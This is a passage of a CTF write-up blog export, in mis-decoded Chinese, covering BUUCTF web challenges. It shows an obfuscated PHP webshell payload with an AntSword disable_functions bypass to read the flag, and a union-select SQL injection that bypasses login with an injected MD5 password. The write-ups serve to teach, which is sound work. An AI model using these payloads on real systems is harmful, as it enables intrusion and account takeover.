llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">èšå‰‘è¿æ¥<br><span class=\"hljs-symbol\">http:</span>//url?code<span class=\"hljs-operator\">=</span>(~<span class=\"hljs-variable\">%9</span>E<span class=\"hljs-variable\">%8</span>C<span class=\"hljs-variable\">%8</span>C<span class=\"hljs-variable\">%9</span>A<span class=\"hljs-variable\">%8</span>D<span class=\"hljs-variable\">%8</span>B)(~<span class=\"hljs-variable\">%9</span>A<span class=\"hljs-variable\">%89</span><span class=\"hljs-variable\">%9</span>E<span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%D7</span><span class=\"hljs-variable\">%DB</span><span class=\"hljs-variable\">%A0</span><span class=\"hljs-variable\">%AD</span><span class=\"hljs-variable\">%BA</span><span class=\"hljs-variable\">%AE</span><span class=\"hljs-variable\">%AA</span><span class=\"hljs-variable\">%BA</span><span class=\"hljs-variable\">%AC</span><span class=\"hljs-variable\">%AB</span><span class=\"hljs-variable\">%A4</span><span class=\"hljs-variable\">%C7</span><span class=\"hljs-variable\">%A2</span><span class=\"hljs-variable\">%D6</span>)<span class=\"hljs-comment\">;</span><br></code></pre></td></tr></table></figure>\n\n<p>ä½†æ˜¯å‘ç°flagæ˜¯ç©ºçš„</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181221552.png\" alt=\"image-20220903181221552\"></p>\n<p>çœ‹äº†å…¶ä»–å¤§ä½¬çš„wpæ‰çŸ¥é“ï¼Œéœ€è¦èšå‰‘æ’ä»¶<code>disable_functions</code>ï¼Œç¦æ­¢ç½‘ç«™çš„å‡½æ•°ï¼Œé˜²æ­¢å…¶é˜»æ­¢è¯»å–flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181348649.png\" alt=\"image-20220903181348649\"></p>\n<p>å†åœ¨ä¸»é¡µå³é”®</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181431745.png\" alt=\"image-20220903181431745\"></p>\n<p>æ¨¡å¼é€‰æ‹©</p>\n<p><img src=\"/post/wp-buuctf/image-20220903181451266.png\" alt=\"image-20220903181451266\"></p>\n<p>ç„¶åç‚¹å‡»å¼€å§‹</p>\n<p>ç»ˆç«¯è¾“å…¥</p>\n<p><code>/readflag</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220903181528195.png\" alt=\"image-20220903181528195\"></p>\n<p>å¾—åˆ°flag</p>\n<h2 id=\"12-GXYCTF2019-BabySQli\"><a href=\"#12-GXYCTF2019-BabySQli\" class=\"headerlink\" title=\"12.[GXYCTF2019]BabySQli\"></a>12.[GXYCTF2019]BabySQli</h2><h3 id=\"1-é¢˜ç›®æè¿°-9\"><a href=\"#1-é¢˜ç›®æè¿°-9\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-9\"><a href=\"#2-wp-9\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>å¼€å§‹æ˜¯ä¸€ä¸ªç™»å½•æ¡†</p>\n<p><img src=\"/post/wp-buuctf/image-20220909203922998.png\" alt=\"image-20220909203922998\"></p>\n<p>æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å¯†ç </p>\n<figure class=\"highlight nsis\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nsis\">è´¦å·ï¼š<span class=\"hljs-literal\">admin</span><br>å¯†ç ï¼š<span class=\"hljs-number\">123456</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220909204018695.png\" alt=\"image-20220909204018695\"></p>\n<p>æŠ¥é”™ï¼Œçœ‹æ¥ç”¨æˆ·åæ²¡é”™ï¼Œå¯†ç é”™è¯¯</p>\n<p>æŸ¥çœ‹æºç çœ‹çœ‹</p>\n<p><img src=\"/post/wp-buuctf/image-20220909204046072.png\" alt=\"image-20220909204046072\"></p>\n<p>å‘ç°æœ‰ä¸€ä¸²åŠ å¯†å­—ç¬¦ï¼Œçœ‹èµ·æ¥åƒbase</p>\n<p>å…ˆç”¨<code>base32</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220909204202994.png\" alt=\"image-20220909204202994\"></p>\n<p>çœ‹èµ·æ¥å°±æ˜¯<code>base32+base64</code>æ··åˆç¼–ç ï¼Œå†ç”¨<code>base64</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220909204325138.png\" alt=\"image-20220909204325138\"></p>\n<hr>\n<p>å½“ç„¶çœ‹ä¸å‡ºæ¥ï¼Œç›´æ¥æ— è„‘<code>ciphey</code>ï¼Œä¹Ÿå¯ä»¥ï¼Œå½“ç„¶è¿˜æ˜¯éœ€è¦äº†è§£ä¸åŒç¼–ç å’ŒåŠ å¯†å­—ç¬¦çš„ç‰¹ç‚¹</p>\n<p><img src=\"/post/wp-buuctf/image-20220909204746167.png\" alt=\"image-20220909204746167\"></p>\n<p>ä¹Ÿå¯ä»¥å¾—åˆ°è§£ç ç»“æœ</p>\n<hr>\n<p>ç”±</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\"><span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> <span class=\"hljs-keyword\">user</span> <span class=\"hljs-keyword\">where</span> username = <span class=\"hljs-string\">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure>\n\n<p>å¯çŸ¥ï¼Œsqlæ³¨å…¥ç‚¹åœ¨Usernameå¤„ï¼Œä¸”ä¸ºå•å¼•å·é—­åˆ</p>\n<p>äºæ˜¯æˆ‘ä»¬å°æ„é€ æ³¨å…¥</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">name</span>=admin&#x27;%<span class=\"hljs-number\">20</span>and%<span class=\"hljs-number\">201</span>=<span class=\"hljs-number\">1</span>#&amp;pw=<span class=\"hljs-number\">123456</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220909205630033.png\" alt=\"image-20220909205630033\"></p>\n<p>å‘ç°æœ‰çš„å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨fuzzçˆ†ç ´æµ‹è¯•çœ‹çœ‹ï¼Œä¹Ÿå¯ä»¥ä¸€ä¸ªä¸€ä¸ªè¯•</p>\n<p>æˆ‘è¿™é‡Œå…ˆçˆ†ç ´è¯•è¯•ï¼ˆå»ºè®®çˆ†ç ´è¿˜æ˜¯æ…¢ä¸€äº›ï¼Œåé¢ç›´æ¥å¤ªå¤šè¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¸å‘è¿”å›åŒ…äº†ï¼‰</p>\n<p>å¤§æ¦‚ç»Ÿè®¡ä¸€ä¸‹</p>\n<figure class=\"highlight abnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs abnf\">or<br>()<br><span class=\"hljs-operator\">=</span><br></code></pre></td></tr></table></figure>\n\n<p>æ‰€ä»¥æˆ‘ä»¬åªæœ‰å…ˆè¯•è¯•è”åˆæ³¨å…¥</p>\n<figure class=\"highlight axapta\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs axapta\">ç”±äºè¿‡æ»¤äº†or<br>æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨<span class=\"hljs-keyword\">order</span> <span class=\"hljs-keyword\">by</span>æ¥åˆ¤æ–­åˆ—æ•°ï¼Œå¯ä»¥ç”¨è”åˆæ³¨å…¥ï¼Œåˆ©ç”¨<span class=\"hljs-keyword\">select</span>çš„ç»“æœæ¥åˆ¤æ–­<br></code></pre></td></tr></table></figure>\n\n<p>å…ˆè¯•è¯•<code>select 1,2</code></p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">name</span>=admin&#x27;%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,<span class=\"hljs-number\">2</span>#&amp;pw=<span class=\"hljs-number\">123456</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220909214254664.png\" alt=\"image-20220909214254664\"></p>\n<p>å‘ç°æŠ¥é”™ï¼Œåˆ—æ•°æœ‰é—®é¢˜</p>\n<p>å†è¯•è¯•<code>select 1,2,3</code></p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">name</span>=admin&#x27;%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>#&amp;pw=<span class=\"hljs-number\">123456</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220909214345515.png\" alt=\"image-20220909214345515\"></p>\n<p>å‘ç°è™½ç„¶æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰ç›´æ¥å›æ˜¾</p>\n<p>å†è¯•è¯•<code>select 1,2,3,4</code></p>\n<p>åˆæŠ¥é”™</p>\n<p><img src=\"/post/wp-buuctf/image-20220909214506605.png\" alt=\"image-20220909214506605\"></p>\n<p><strong>æ‰€ä»¥å¾—å‡º<code>åˆ—æ•°ä¸€å…±æœ‰3åˆ—</code></strong></p>\n<p><strong>æ ¹æ®ç»éªŒè¿™ä¸‰åˆ—ï¼Œåˆ†åˆ«æ˜¯</strong><u><strong>id,username,password</strong></u></p>\n<p>æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥è¿›è¡Œç¡®è®¤</p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\">name=<span class=\"hljs-number\">-1</span>&#x27;%<span class=\"hljs-number\">20</span><span class=\"hljs-built_in\">union</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-built_in\">select</span>%<span class=\"hljs-number\">20</span>â€adminâ€œ,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span><span class=\"hljs-meta\">#&amp;pw=123456   </span><br><span class=\"hljs-comment\">//æŠŠç¬¬ä¸€ä½ï¼Œå³1çš„ä½ç½®æ¢æˆç”¨æˆ·åadmin</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220910085003536.png\" alt=\"image-20220910085003536\"></p>\n<p>æç¤ºç”¨æˆ·åé”™è¯¯ï¼Œçœ‹æ¥ç”¨æˆ·åä¸åœ¨ç¬¬ä¸€ä½</p>\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">-1</span>&#x27;<span class=\"hljs-variable\">%20</span>union<span class=\"hljs-variable\">%20</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-variable\">%201</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-string\">&quot;admin&quot;</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-number\">3</span>#&amp;pw<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">123456</span><br>//æŠŠç¬¬äºŒä½ï¼Œå³<span class=\"hljs-number\">2</span>çš„ä½ç½®æ¢æˆç”¨æˆ·åadmin<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220910085115686.png\" alt=\"image-20220910085115686\"></p>\n<p>æç¤ºå¯†ç é”™è¯¯ï¼Œçœ‹æ¥ç”¨æˆ·åå›æ˜¾å°±åœ¨ç¬¬äºŒä½</p>\n<p><strong>ä½†æ˜¯æ²¡æœ‰å›æ˜¾æˆ‘ä»¬selectçš„æ•°æ®ï¼Œå¯æ˜¯å¦‚æœç”¨æŠ¥é”™æ³¨å…¥å’Œç›²æ³¨çš„è¯ï¼Œ()è¢«è¿‡æ»¤äº†ï¼Œä¹Ÿä¸èƒ½ç”¨</strong></p>\n<p>æ‰€ä»¥æˆ‘ä»¬åªæœ‰è€ƒè™‘ï¼Œæ€ä¹ˆæ‰å¯ä»¥ç™»å½•ä¸Šå»</p>\n<p>é¦–å…ˆè¿™æ˜¯ä¸€ä¸ªsqlæ³¨å…¥çš„é¢˜ç›®ï¼Œå¯†ç ä¸å¯èƒ½ç®€å•çš„çˆ†ç ´å°±å¯ä»¥è§£å†³</p>\n<p><strong>å¯†ç è‚¯å®šæ˜¯è¿›è¡ŒåŠ å¯†ï¼Œæœ€å¸¸è§çš„å¯†ç åŠ å¯†å°±æ˜¯md5</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨<code>md()</code>å‡½æ•°æŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†ï¼Œå†åŠ ä¸Šæˆ‘ä»¬çš„ç”¨æˆ·åä¸€èµ·å¯¼å…¥åˆ°é¢˜ç›®çš„æ•°æ®åº“é‡Œï¼Œå³å¯å®Œæˆç™»å½•</p>\n<p>æ³¨æ„å› ä¸º<code>()</code>è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥åªèƒ½å…ˆæŠŠå¯†ç è¿›è¡Œmd5åŠ å¯†ï¼Œåœ¨å¯¼å…¥ï¼Œè€Œä¸èƒ½ç›´æ¥ç”¨å‡½æ•°</p>\n<hr>\n<p>è¿™é‡Œåˆæœ‰ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹</p>\n<p><strong>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚ã€union selectã€‘</strong></p>\n<p>åœ¨<code>Web-study</code>é‡Œå†™çš„è¯¦ç»†</p>\n<p>ä¸‹é¢ç®€å•è¯´ä¸€ä¸‹æµç¨‹</p>\n<p>å…ˆæŠŠæˆ‘ä»¬çš„å¯†ç 123456åˆ©ç”¨md5åŠ å¯†</p>\n<p><img src=\"/post/wp-buuctf/image-20220910090640990.png\" alt=\"image-20220910090640990\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">e10adc3949ba59abbe56e057f20f883e<br></code></pre></td></tr></table></figure>\n\n<p>ç„¶åæ„é€ payload</p>\n<figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs q\">name=<span class=\"hljs-number\">-1</span>&#x27;%<span class=\"hljs-number\">20</span><span class=\"hljs-built_in\">union</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">select</span>%<span class=\"hljs-number\">201</span>,<span class=\"hljs-string\">&quot;admin&quot;</span>,<span class=\"hljs-string\">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;pw=<span class=\"hljs-number\">123456</span><br><br>/*<br>è”åˆæ³¨å…¥çš„æŠ€å·§ï¼Œå°±æ˜¯åœ¨ä½¿ç”¨<span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span>æ—¶å€™ï¼Œåé¢çš„æ•°æ®å¦‚æœä¸å­˜åœ¨ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®<br>å¦‚ä¸Šé¢çš„<br><br>æ ¹æ®ä¸Šé¢baseç¼–ç ç»“æœï¼Œ<span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> user <span class=\"hljs-built_in\">where</span> username = &#x27;$name&#x27;<br><br>æˆ‘ä»¬åˆ©ç”¨<span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-string\">&quot;admin&quot;</span>,<span class=\"hljs-string\">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><br><br>å› ä¸ºuserè¡¨é‡Œä¸å­˜åœ¨id=<span class=\"hljs-number\">1</span>,username=admin,password=e10adc3949ba59abbe56e057f20f883e<br><br>æ‰€ä»¥ä¼šç”Ÿæˆä¸€ä¸ªä¸€ä¸ªæ•°æ®æ’å…¥è¡¨ä¸­<br>*/<br>/*<br>å½“nameå‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼ŒæŠŠæ•°æ®æ’å…¥userè¡¨ä¸­æ—¶<br>åé¢passwordåªè¦å’Œæ˜æ–‡ä¸€æ ·ï¼Œå³å¯ç™»å½•æˆåŠŸ<br>*/<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220910091405613.png\" alt=\"image-20220910091405613\"></p>\n<p>å¾—åˆ°flag</p>\n<h2 id=\"13-æŠ¤ç½‘æ¯-2018-easy-tornado\"><a href=\"#13-æŠ¤ç½‘æ¯-2018-easy-tornado\" class=\"headerlink\" title=\"13.[æŠ¤ç½‘æ¯ 2018]easy_tornado\"></a>13.[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><h3 id=\"1-é¢˜ç›®æè¿°-10\"><a href=\"#1-é¢˜ç›®æè¿°-10\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-10\"><a href=\"#2-wp-10\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3>","text":"webå„ä¸ªæ–¹é¢é€‰æ‹©äº†ä¸€äº›é¢˜ç›®è¿›è¡Œå­¦ä¹ ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾—ç¬¬ä¸€æ¬¡å°±åº”è¯¥çœ‹é€šå½»ï¼Œä¸åº”è¯¥ç•™æœ‰é—®é¢˜ï¼Œèƒ½å¤Ÿæ˜ç™½åŸç†å’Œä»£ç ä¸­å“ªå‡ºé€ æˆè¿™ä¸ªçš„åŸå› ï¼Œåå¤åš¼å‰©é¥­æ„Ÿè§‰æµªè´¹æ—¶é—´ Web1.[...","permalink":"/post/wp-buuctf","photos":[],"count_time":{"symbolsCount":"30k","symbolsTime":"27 mins."},"categories":[{"name":"ç½‘ç»œå®‰å…¨å­¦ä¹ ","slug":"ç½‘ç»œå®‰å…¨å­¦ä¹ ","count":26,"path":"api/categories/ç½‘ç»œå®‰å…¨å­¦ä¹ .json"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","count":5,"path":"api/tags/é¶åœº.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Web\"><span class=\"toc-text\">Web</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8\"><span class=\"toc-text\">1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%EF%BC%89%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">1ï¼‰é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%EF%BC%89wp\"><span class=\"toc-text\">2ï¼‰wp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">å †å æ³¨å…¥</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF2%EF%BC%9A%E9%A2%84%E5%A4%84%E7%90%86%E7%BB%95%E8%BF%87select%E9%99%90%E5%88%B6\"><span class=\"toc-text\">è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF3%EF%BC%9Ahandler%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#handler%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">handleråŸºæœ¬ç”¨æ³•</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B\"><span class=\"toc-text\">å®ä¾‹</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-GXYCTF2019-Ping-Ping-Ping\"><span class=\"toc-text\">2.[GXYCTF2019]Ping Ping Ping</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2\"><span class=\"toc-text\">3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-1\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-RoarCTF-2019-Easy-Calc\"><span class=\"toc-text\">4.[RoarCTF 2019]Easy Calc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-2\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL\"><span class=\"toc-text\">5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-3\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1\"><span class=\"toc-text\">6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-HCTF-2018-admin\"><span class=\"toc-text\">7.[HCTF 2018]admin</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-4\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8-ZJCTF-2019-NiZhuanSiWei\"><span class=\"toc-text\">8.[ZJCTF 2019]NiZhuanSiWei</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-5\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-SUCTF-2019-CheckIn\"><span class=\"toc-text\">9.[SUCTF 2019]CheckIn</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-6\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-GXYCTF2019-BabyUpload\"><span class=\"toc-text\">10.[GXYCTF2019]BabyUpload</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-7\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME\"><span class=\"toc-text\">11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-8\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#12-GXYCTF2019-BabySQli\"><span class=\"toc-text\">12.[GXYCTF2019]BabySQli</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-9\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#13-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado\"><span class=\"toc-text\">13.[æŠ¤ç½‘æ¯ 2018]easy_tornado</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-10\"><span class=\"toc-text\">1)é¢˜ç›®æè¿°</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-10\"><span class=\"toc-text\">2)wp</span></a></li></ol></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"å¿…é¡»ä»è¿‡å»çš„é”™è¯¯å­¦ä¹ 